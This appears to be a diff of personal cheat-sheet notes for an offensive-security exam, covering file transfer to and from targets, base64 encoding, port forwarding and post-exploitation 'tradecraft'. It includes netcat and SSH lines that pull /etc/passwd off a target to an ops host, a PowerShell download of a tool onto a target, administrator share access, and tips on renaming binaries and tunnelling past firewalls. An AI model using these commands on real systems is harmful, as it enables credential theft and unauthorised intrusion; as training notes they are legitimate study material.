+		m5sum file.txt /sha1sum file.txt  
+	windows
+		certutil -hashfile file.txt MD5
+			certutil -hashfile file.txt # older versions, md5 only, no md5 argument
+		cygwin
+		
+clipboard paste techniques 
+- very effective with windows terminals: BUT NOT PREFERRABLE bc slow/error-prone. Unacceptable OPSEC risk. 
+1. convert binary file to ASCII (by encoding via base64)
+2. copy/paste onto target 
+3. decode base64 
+
+# CONSIDERATIONS:
+1. File size. Consider packing executables (executable compression) - packers: smaller size/ slightly less efficient runtime. Some antivirus flag packed executables as malware 
+2. x86 vs x64?
+3. static vs dynamic linked libarary tools? 
+	static > preferred (if size can be managed) 
+4. when transferring text/scripts from linux > win, BEWARE \n issue 
+	UNIX uses [LF] (ASCII code 10) for end of textline 
+	WIN uses [CR][LF] (ASCII code 13 and 10)
+	- windows notepad++ has an edit EOL conversion option 
+	- unix has dos2unix/ unix2dos
+
+}
+
+{ # Netcat transfer 
+Basic file transfer
+#1. listen on linux ops 
+nc -l 8888 < /etc/passwd 
+#2. windows (grab via tgt)
+nc linux.ops.local 8888 > passwd 
+
+Reverse NC transfer 
+#1. host listener on linux ops 
+nc -l 12345 > passwd 
+#2. send via tgt 
+nc 192.168.11.13 12345 < passwd 
+
+}
+
+{ # ncat 
+- offers ipv4+ipv6, SSL support, socks/http proxy, supports solaris/linux/windows
+- same nc syntax 
+	ncat <ip> <port> < file 
+	
+}
+
+{ # socat 
+- unix only, ipv4+ipv6, ROBUST redirection 
+
+}
+
+{ # smbclient 
+smbclient -L <IP> -U "user"
+smbclient //192.168.11.10/C$ -U "administrator"
+
+# todo: add impacket smbserver.py method 
+}
+
+{ # webserv 
+
+# setup
+python3 http.server 8000
+	ssh -R8000:127.0.0.1:8080
+
+# win pull 
+
+powershell -****** Invoke-WebRequest -Uri "http://192.168.11.15:8000/fpipe.exe" -OutFile "c:\temp\fpipe.exe"
+
+
+# nix pull
+curl *** 
+
+}
+
+{ # terminal cut and paste (linux clipboard transfers using windows)
+
+{ steps 
+(on linux, just encode, paste, decode)
+
+1. encode file (e.g.) base64 
+2. on remote tgt terminal, capture text typed into shell into file w/shell redirection
+	unix
+		cat > target.64
+	windows
+		more > target.64
+3. cut and paste text into remote tgt terminal text window
+4. decode with base64 on remote end 
+} 
+
+{ # VIDEO STEPS - using windows, clipboard copy binary tool from target1 (linux.ops.local) to target2 (1337h4x.ops.local)
+1. putty into linux.ops.local, encode the tool ('/tmp/yes' for this example)
+	base64 /tmp/yes 
+2. right click linux.ops.local terminal, click 'copy all to clipboard'
+3. paste into windows notepad++, clean up file so its only encoded binary file 
+4. copy encoded binary to clipboard
+
+5. putty into 1337h4x.ops.local (target2)
+6. prep destination screen terminal window to accept file 
+	cat > /tmp/yes.64
+6.5 rightclick window to paste base64, CTRL-C to exit 
+7. decode 
+	cat /tmp/yes.64 | base64 -di > yes
+} 
+	
+# cut/paste into windows TELNET terminal issue workaround - requires "paste delay"
+need to use a client that allows us to set a "paste delay"
+1. Connect to RD via TeraTerm
+2. In TeraTerm, in the menu Setup > Additional Settings > Copy and Paste, set "Paste delay per line" value to 150ms
+
+# LINUX TERMINAL COPY/PASTE PROTIP - can scroll to top of linux terminal, highlight and hit SPACE to get to bottom! 
+	- works for telnet/ssh
+}
+
+
+}
+
+{ # Master/Slaves SCP 
+ssh -S /tmp/tX.ssh -O forward <> d 
+ssh -S /tmp/tX.ssh -O cancel d 
+
+# file download 
+scp -o ControlPath=/tmp/tX.ssh dummy@dummy:/remote /tmp/
+
+# recursive download 
+scp -r -o ControlPath=/tmp/tX.ssh dummy@dummy:/remotedir /tmp/
+
+# collect files with spaces 
+	scp -o controlpath=/tmp/tX.ssh dummy@dummy:/dir/path/'File\ with\ spaces.docx' /tmp/ 
+
+# SSH (non SCP) download 
+ssh -S /tmp/tX.ssh dummy@dummy "cat /etc/passwd" >> ./passwd
+	
+
+}
+
+
+}
+
+# encoding  {
+
+# openssl 
+openssl enc -base64 < file.wmav
+	openssl enc -base64 < file.wmav > file.64
+
+cat > /tmp/file.64 
+openssl enc -base64 -d < /tmp/file.64 > /tmp/file.wmav
+
+# python
+python -m base64 [file.64]
+python -m base64 -d [file.64]
+
+# certutil 
+certutil -encode [infile] [outfile]
+certutil -decode [infile] [outfile]
+
+# powershell
+// To Base64 Encode a File via Powershell 
+$ec=get-content -Encoding Byte "YOUR INPUT FILENAME HERE" 
+$eE=[System.Convert]::ToBase64String($eC,[System.Base64FormattingOptions]::InsertLineBreaks) 
+$eE | set-content -Encoding ASCII "YOUR OUTPUT FILENAME HERE" 
+
+// To Base64 Decode a File via Powershell 
+$fs=(get-content "YOUR INPUT FILENAME HERE") -join "" 
+$fD=[System.Convert]::FromBase64string($fs) 
+$fD | set-content -Encoding Byte "YOUR OUTPUT FILENAME HERE" 
+
+// To uudecode a File via Perl 
+perl -e '$in=""; open OUT,">YOUR OUTPUT FILENAME HERE..; binmode OUT; while (<>){next if /^begin/; last if /^end/; $in .= $_;} print "Bytes in:".length($in)."\n"; $out=unpack "u",$in; print "Bytes out:".length($out)."\n"; print OUT $out;'
+
+# differences between certutil encode and base64/other methods 
+- certutil includes a "---BEGIN CERTIFICATE--- /  ---END CERTIFICATE---
+- different line lengths, windows 64-character; linux 76-char per line 
+
+
+}
+
+# MISC Windows  {
+
+# RUNAS syntax 
+runas /user:administrator "command"
+
+# mount windows share 
+net use x: \\172.16.100.200\images /user:administrator 
+net use x: \\172.16.100.200\c$ /user:administrator 
+
+# full search 
+dir /b /s *vehicle.jpg*
+
+# Powershell HTTP GET / grab 
+Invoke-WebRequest -Uri "http://192.168.11.15:8081/graphics/service.jpg " -OutFile "c:\temp\service.jpg"
+
+}
+
+# MISC NIX  {
+
+#  LPF / RPF syntax {
+
+# LPF 
+-L<listener-config>:<forwarder-config>
+	-L<listener-interface>:<listener-port>:<forwarder-interface>:<forwarder-port>
+
+me ---> listener --->--->---> forwarder ---> target 
+
+# RPF 
+-R<listener-config>:<forwarder-config>
+	-R<listener-interface>:<listener-port>:<forwarder-interface>:<forwarder-port>
+
+me <--- forwarder <---<---<--- listener <--- target 
+
+}
+
+# check num virtual webhosts 
+apache2ctl -t -D DUMP_VHOSTS
+ls -al /etc/apache2/sites-enabled/
+
+!!! - remember with tunnels in regard to firewalls! 
+- SSH tunnels will BYPASS firewall restricts by encapsulating traffic in SSH
+- only need to worry about firewall rules via TCP connection ENTERING the tunnel and EXITING the tunnel (on listener/forwarder)
+
+}
+
+=========================================================================================================================
+}
+
+}
+
+
+
+
+
+
+``` TODO: ``` 
+
+# Exam 2 TODO 
+- review sophosAV
+	^ Remote Hosts 3
+- review is_known_pipe exploit (feel good - FW & portfwds)
+	- Post Exploit Surv: Exercise 3
+
+# personal notes - DO DIFFERENT 
+POST EXPLOIT SURVEY 
+- when exploit on machine, run basic survey BEFORE cred grab 
+	- always check FW rules on receiving/sending end before exploit 
+		- (even after exploit on tgt machine)
+TRADECRAFT 
+- use different names for binaries (e.g. handle.exe / listdlls.exe ) ``` !!! ``` 
+- consider: no typos (paste only)
+
+==============================================================================================
+
+- make epoch converter script or alias
+	- make little->big end script
+	
+- note: When you attempt to grep for a string in a log file, if you get the response "Binary file matches", then add the -a option to your grep command to force grep to ignore what the system thinks is a binary file, but which really isn't.
+
+# epoch -> human
+date -d "@<epoch>"
+
+# human -> epoch 
+date +"%s" -d "2023-07-15 12:38:09"
+
+
+
+
